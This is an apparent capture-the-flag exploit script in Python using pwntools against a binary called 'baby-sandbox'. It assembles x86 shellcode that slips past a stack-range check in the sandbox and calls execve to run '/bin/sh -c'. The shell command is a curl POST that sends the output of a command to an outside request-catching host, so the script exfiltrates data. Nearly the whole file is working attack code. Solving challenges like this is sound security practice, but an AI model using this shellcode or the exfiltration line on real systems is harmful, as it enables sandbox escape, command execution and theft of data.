from pwn import *

context.terminal = ['tmux', 'split', '-h']

p = process("./baby-sandbox")

prefix = asm("mov edx, eax") # Saving address of payload

"""
  register int esp asm("esp");
  if ((esp >= (0x1000000 + 0x200000)) &&
      (esp <= (0x1000000 + 0x200100)) ) {
    asm("mov $1, %eax");
    asm("int $0x80");
  }

"""
cond = "\x55\x89\xe5\x89\xe0\x3d\xff\xff\x1f" + \
       "\x01\x7e\x10\x89\xe0\x3d\x00\x01\x20" + \
       "\x01\x7f\x07\xb8\x01\x00\x00\x00\xcd" + \
       "\x80\x90\x5d"

execve  = asm("""
mov eax, 0xb;
add edx, 0x50;
mov ebx, edx;

mov [esp], edx;
add edx, 8;
add esp, 4;
mov [esp], edx;
add edx, 3;
add esp, 4;
mov [esp], edx;
add esp, 4;
xor edx, edx;
mov [esp], edx;
sub esp, 12;

mov ecx, esp;
int 0x80;
"""
)

payload = (prefix + cond + execve).ljust(0x50, "\x00")
payload += "/bin/sh\x00"
payload += "-c\x00"

command = "ls"

payload += "curl -XPOST http://vampire.proxy.beeceptor.com --data \"$(" + \
           command + \
           ")\""

if len(payload) > 0x100:
    print("Too much")
else:
    print(base64.b64encode(payload))

p.send(payload)

p.interactive()
